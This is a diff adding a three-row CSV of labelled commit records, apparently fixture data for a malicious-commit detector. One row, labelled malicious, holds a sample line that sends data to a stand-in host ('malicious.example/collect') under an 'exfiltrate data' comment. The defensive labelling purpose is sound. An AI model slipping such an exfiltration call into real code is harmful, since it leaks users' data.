@@ -1,0 +1,4 @@
+commit_id,author,timestamp,files_changed,diff,label
+c1,alice,2025-08-01T12:00:00,/frontend/app.js,"+    console.log(""fix typo"")",benign
+c2,bob,2025-08-02T13:00:00,/src/payments.py,"+    // exfiltrate data\n+    sendTo(""http://malicious.example/collect"", data);",malicious
+c3,carol,2025-08-03T09:00:00,/infra/terraform/main.tf,+    changed resource count,benign
